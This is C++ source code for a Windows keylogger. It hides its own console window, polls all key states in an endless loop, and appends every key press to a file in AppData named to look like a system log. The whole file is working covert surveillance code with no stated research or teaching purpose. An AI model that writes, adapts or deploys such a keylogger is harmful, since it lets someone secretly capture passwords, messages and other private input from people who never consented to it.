#include <iostream>
#include <windows.h>
#include <fstream>
#include <string>
using namespace std;
void logKey(string key) {
    std::ofstream logFile("C:\\Users\\Hadil\\AppData\\Roaming\\SystemLog\\log.txt", std::ios::app);
    logFile<<key<<endl;
    logFile.close();
}
int main(){
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    while(true){
        for (int i = 0; i < 255; i++){
            if(GetAsyncKeyState(i) & 0x8000){
                string wip ="user pressed :";
                string key;
                switch (i){
                    case 13:
                        key="ENTER";
                        break;
                    case 32:
                        key="SPACE";
                        break;
                    case 9:
                        key="TAB";
                        break;
                    default:
                        key =char(i);
                        break;
                }
                wip=wip+key;
                logKey(wip);
            }  
        }
    }
    return 0; 
}
